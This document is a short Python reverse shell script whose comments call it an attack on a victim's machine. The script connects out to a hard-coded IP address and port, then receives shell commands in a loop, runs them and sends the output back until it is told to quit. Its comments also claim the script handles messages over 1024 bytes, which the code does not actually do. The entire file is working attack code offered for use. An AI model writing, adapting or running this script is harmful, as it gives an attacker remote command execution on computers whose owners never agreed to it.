#!/usr/local/bin/python3

# This is a global network attack, this can be used while the victim is on a different network

import socket # Library used for socket connection
import subprocess # Library used for running commands on the machine 
import json # Library used for collecting and sending over 1024 byte information


def send_output(data, target): # Fourth Function used to send output to the host listener

    json_data = json.dumps(data) # Dump all data, even that over 1024 bytes
    target.send(json_data.encode()) # Send all of this data to the host listener


def receive_info(target): # Third Function used to receive incoming commands

    while True: # Always listening for commands
            try: # Try and except to allow more then 1024 byte data
                    data = target.recv(1024) # receive incoming data at 1024 bytes
                    data = data.decode() # Decode this data 
                    return json.loads(data) # Return the decoded data to the shell function
            except ValueError: # Except for when incoming data is over 1024 bytes
                    continue # Continue adding the info to a variable and returning the data


def shell(sock): # Second Function used to send and receive information
    while True: # Statement that is always true will not close the connection unless told to do so
        command = receive_info(sock) # Send the connection to the Receive info function
        if command == 'quit': # If the command is to quit
            break # break out of the loop
        else: # Otherwise
            cmd = subprocess.getoutput(str(command)) # Get the output for the command 
            send_output(cmd, sock) # Send this output and the connection to the Fourth Function


def main(): # First function
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Open socket connections 
    sock.connect(('75.68.156.178', 6996)) # YOU MUST SET THIS PROPERLY BEFORE USING
    shell(sock) # Send this connection to the shell function

    sock.close() # Close the socket connection 


if __name__ == '__main__': # True statement to call main function 

    main()
